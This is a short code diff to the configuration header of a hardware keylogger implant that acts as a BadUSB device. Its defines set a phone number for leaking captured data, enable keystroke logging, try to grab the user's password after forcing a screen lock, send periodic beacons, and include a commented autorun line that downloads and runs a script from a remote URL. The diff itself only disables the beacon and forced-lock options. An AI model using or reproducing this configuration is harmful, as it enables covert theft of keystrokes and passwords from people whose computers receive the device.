@@ -8,7 +8,7 @@
 /*******************************************/
 #define LEAK_PHONE_NUMBER "+34nnnnnn"		// Introduce the destination phone number with country code
 #define IMPLANT_NAME "KeyVL1"	         			// Identify device when multiple used			
-#define BEACON true                         // Un-comment to send beacons every BEACON_TIME 
+//#define BEACON true                         // Un-comment to send beacons every BEACON_TIME 
 #define KEYLOGGER true                      // Un-comment to work also as keylogger (if commented, just work as badusb)
 #define GETLANG true                        // Un-comment to try to get keyboard language
 #define DEFLANG "en_US"                     // Default keyboard language to use, if not detected
@@ -16,7 +16,7 @@
 //#define AUTORUN "UnlockDownload##lnx##PASSWORD##https://s3.amazonaws.com/testing/hello_lin"   // Autorun script to be run on connect
 #ifndef AUTORUN
   #define GETPASS true               // Un-comment to be smart and try to get user password after lock
-  #define LOCKPC true                // Un-comment if you want to force lock when connecting to computer
+  //#define LOCKPC true                // Un-comment if you want to force lock when connecting to computer
 #endif
 
 #define DEBUG true                  // Un-comment if you want to build with DEBUG.
@@ -48,4 +48,4 @@ extern String os;
   #define BEACON_TIME 10 // Time in minutes we will send a beacon to let know the implant is alive
 #else
   #define BEACON_TIME 60 // Time in minutes we will send a beacon to let know the implant is alive
-#endif                      
+#endif  
